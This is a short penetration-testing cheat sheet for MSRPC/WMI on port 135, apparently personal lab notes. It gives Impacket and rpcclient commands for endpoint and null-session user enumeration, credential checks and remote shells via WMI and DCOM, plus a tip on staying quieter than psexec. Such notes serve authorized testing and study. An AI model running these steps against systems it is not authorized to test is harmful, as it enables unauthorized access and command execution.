# MSRPC / WMI (DCOM)

### Port: 135

## Service Usage

Query MSRPC endpoints
```bash
impacket-rpcdump $ip
```
Query via rpcclient (null session)
```bash
rpcclient -U "" -N $ip -c "srvinfo"
```
WMI exec (needs creds)
```bash
impacket-wmiexec $domain/$un:$pw@$ip
```

## 0. Fast Path (try these first)

Endpoint dump (reveals what RPC services are exposed)
```bash
impacket-rpcdump $ip
```
Usually 135 pairs with SMB — so most of your 135 work is really SMB/WMI exec. See SMB notes.

## 1. Banner Grab & Unauthenticated Enumeration

Version and default-script scan
```bash
nmap -p 135 -sV -sC $ip
```
Enumerate endpoints
```bash
impacket-rpcdump $ip
```
Enumerate users via null session
```bash
rpcclient -U "" -N $ip -c "enumdomusers"
```

## 2. Authenticated Enumeration

Enumerate users, groups, shares with creds
```bash
rpcclient -U "$un%$pw" $ip -c "enumdomusers; enumdomgroups; netshareenumall"
```
Shell via WMI
```bash
impacket-wmiexec $domain/$un:$pw@$ip
```
Run a WMI query (single command)
```bash
impacket-wmiexec $domain/$un:$pw@$ip 'systeminfo'
```

## 3. Password Spraying / Bruteforcing

Same as SMB — MSRPC is just another transport for the same creds.
Single credential check
```bash
rpcclient -U "$un%$pw" $ip -c "srvinfo"
```

## 5. Quick Wins

### 5.1 Valid creds → WMI shell
```bash
impacket-wmiexec $domain/$un:$pw@$ip
```

### 5.2 DCOM execution (if WMI blocked)
```bash
impacket-dcomexec $domain/$un:$pw@$ip
```

### 5.3 Anonymous endpoint discovery
```bash
impacket-rpcdump $ip
```

## 6. Config Paths

Windows DCOM
```text
HKLM\SOFTWARE\Microsoft\OLE          # DCOM settings
```

## 7. Post-Exploit / Pivot

- WMI shell → PrivEsc (see Windows PrivEsc notes)
- Endpoint dump → find additional attack surface

### Common gotchas
```text
- 135 open usually means 445/139 open too — treat them together.
- wmiexec is quieter than psexec; try wmiexec first for a shell.
- "Access denied" on rpcclient = need creds (most boxes disable anonymous SID enum).
```